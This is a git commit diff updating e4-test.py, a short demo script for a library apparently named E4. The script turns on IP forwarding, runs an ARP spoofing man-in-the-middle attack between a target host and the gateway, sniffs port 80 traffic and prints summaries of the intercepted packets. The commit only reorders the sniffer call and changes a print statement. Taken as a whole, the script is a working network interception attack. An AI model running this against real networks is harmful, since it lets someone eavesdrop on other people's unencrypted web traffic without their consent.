1bbcbd32733b67d08b8b44cf3984c07649348d30
Tristan Strathearn <r3oath@gmail.com>
2013-05-31 14:21:36 +1000

    Updated demo code.

--- e4-test.py
+++ e4-test.py
@@ -7,6 +7,9 @@ import E4, E4Web, E4Arp, sys
 e4Arp = E4Arp.Arp()
 e4Sniffer = E4.AsyncSniffer()
 e4PacketLog = E4.PacketLog()
+e4Web = E4Web.Web()
+
+e4Sniffer.sniff(packetLog=e4PacketLog, filter='port 80')
 
 target = E4.NetworkObject()
 target.setIP('<address>')
@@ -17,14 +20,12 @@ gateway.setIP('<address>')
 e4Arp.forward(True)
 e4Arp.MITM(target, gateway)
 
-e4Sniffer.sniff(packetLog=e4PacketLog, filter='port 80')
-
 try:
     while True:
         e4PacketLog.waitForPackets()
 
         for packet in e4PacketLog.takeAll():
-            print packet.sp().summary()
+            print packet.summary()
 
 except KeyboardInterrupt:
     e4Arp.forward(False)
